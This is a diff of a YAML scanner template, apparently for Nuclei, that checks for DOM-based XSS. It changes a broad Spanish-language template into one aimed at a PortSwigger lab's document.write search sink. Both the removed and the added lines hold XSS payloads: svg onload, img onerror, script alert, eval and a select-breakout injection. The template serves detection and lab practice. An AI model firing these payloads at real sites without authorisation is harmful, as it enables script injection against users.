@@ -1,135 +1,37 @@
 id: xss-dom-based
 
 info:
-  name: "XSS DOM-Based con document.write() y manipulaciones dinámicas"
+  name: "PortSwigger DOM XSS via document.write() in search"
   author: "Fabian Morales"
-  severity: Critical
-  description: "Detecta vulnerabilidades de XSS basado en DOM cuando el contenido se inyecta dinámicamente mediante document.write(), innerHTML, eval(), y otros métodos inseguros."
-  tags: xss, dom, reflected, javascript, security
+  severity: "high"
+  description: "Detects the specific DOM XSS vulnerability in PortSwigger's lab using document.write()"
+  reference:
+    - "https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink"
+  tags: xss,dom,portswigger,lab,document-write
 
-requests:
+http:
   - method: GET
     path:
-      - "{{BaseURL}}/?search=<script>document.write('<img src=x onerror=alert(1)>')</script>"
-    matchers-condition: or
-    stop-at-first-match: true
+      - "{{BaseURL}}/?search=\"><svg onload=alert(document.domain)>"
+      - "{{BaseURL}}/?search=\"onmouseover=alert(document.domain)>"
+      - "{{BaseURL}}/?search=<script>alert(document.domain)</script>"
+
+    headers:
+      User-Agent: "Mozilla/5.0"
+      Accept: "text/html,application/xhtml+xml"
+
     matchers:
       - type: regex
-        regex:
-          - "document\\.write\\(.*?<img src=x onerror=alert\\(1\\)>.*?\\)"
         part: body
-        name: "XSS DOM detectado en /?search (document.write)"
-        
-  - method: GET
-    path:
-      - "{{BaseURL}}/?q=<svg/onload=alert(1)>"
-    matchers-condition: or
-    stop-at-first-match: true
-    matchers:
+        regex:
+          - "<svg onload=alert\\(document\\.domain\\)>"
+          - "onmouseover=alert\\(document\\.domain\\)"
+          - "<script>alert\\(document\\.domain\\)</script>"
+        condition: or
+
+    extractors:
       - type: regex
+        name: vulnerable_parameter
         regex:
-          - "<svg/onload=alert\\(1\\)>"
-        part: body
-        name: "XSS DOM detectado en /?q (svg onload)"
-        
-  - method: GET
-    path:
-      - "{{BaseURL}}/?xss=<iframe/src=javascript:alert(1)>"
-    matchers-condition: or
-    stop-at-first-match: true
-    matchers:
-      - type: regex
-        regex:
-          - "<iframe/src=javascript:alert\\(1\\)>"
-        part: body
-        name: "XSS DOM detectado en /?xss (iframe)"
-        
-  - method: GET
-    path:
-      - "{{BaseURL}}/?search=\"><svg onload=alert(1)>"
-    matchers-condition: or
-    stop-at-first-match: true
-    matchers:
-      - type: regex
-        regex:
-          - "\"><svg onload=alert\\(1\\)>"
-        part: body
-        name: "XSS DOM detectado en /?search (svg injection)"
-        
-  - method: GET
-    path:
-      - "{{BaseURL}}/?search=<script>document.body.innerHTML+='<img src=x onerror=alert(1)>'</script>"
-    matchers-condition: or
-    stop-at-first-match: true
-    matchers:
-      - type: regex
-        regex:
-          - "document\\.body\\.innerHTML\\+=.*?<img src=x onerror=alert\\(1\\)>.*?"
-        part: body
-        name: "XSS DOM detectado en /?search (innerHTML)"
-        
-  - method: GET
-    path:
-      - "{{BaseURL}}/?search=<script>setTimeout('alert(1)',1000)</script>"
-    matchers-condition: or
-    stop-at-first-match: true
-    matchers:
-      - type: regex
-        regex:
-          - "setTimeout\\('alert\\(1\\)',1000\\)"
-        part: body
-        name: "XSS DOM detectado en /?search (setTimeout)"
-        
-  - method: GET
-    path:
-      - "{{BaseURL}}/?search=<script>eval('alert(1)')</script>"
-    matchers-condition: or
-    stop-at-first-match: true
-    matchers:
-      - type: regex
-        regex:
-          - "eval\\('alert\\(1\\)'\\)"
-        part: body
-        name: "XSS DOM detectado en /?search (eval)"
-        
-  - method: GET
-    path:
-      - "{{BaseURL}}/?search=<script>var a='alert(1)'; eval(a);</script>"
-    matchers-condition: or
-    stop-at-first-match: true
-    matchers:
-      - type: regex
-        regex:
-          - "var a='alert\\(1\\)'; eval\\(a\\);"
-        part: body
-        name: "XSS DOM detectado en /?search (eval variable)"
-        
-  - method: GET
-    path:
-      - "{{BaseURL}}/product?productId=1&storeId=%22%3E%3C%2Fselect%3E%3Cimg%20src%3D1%20onerror%3Dalert(1)%3E"
-    matchers-condition: or
-    stop-at-first-match: true
-    matchers:
-      - type: word
-        words: 
-        - "/product?productId=1&storeId=%22%3E%3C%2Fselect%3E%3Cimg%20src%3D1%20onerror%3Dalert(1)%3E"
-      - type: regex
-        regex:
-          - "<img src=1 onerror=alert\\(1\\)>"
-        part: body
-        name: "XSS DOM detectado en /product (img src injection)"
-        
-  - method: GET
-    path:
-      - "{{BaseURL}}/product?productId=1&storeId=\"></select><img src=1 onerror=alert(1)>"
-    matchers-condition: or
-    stop-at-first-match: true
-    matchers:
-    - type: word
-      words:
-        - "/product?productId=1&storeId=\"></select><img src=1 onerror=alert(1)>"
-    - type: regex
-      regex:
-        - "<select[^>]*>.*?</select>.*?<img[^>]*src=1 onerror=alert\\(1\\)>"
-      part: body
-      name: "XSS DOM detectado en /product con inyección (select y img)"
+          - "document\\.write\\(.*?search=([^&]+)"
+        group: 1
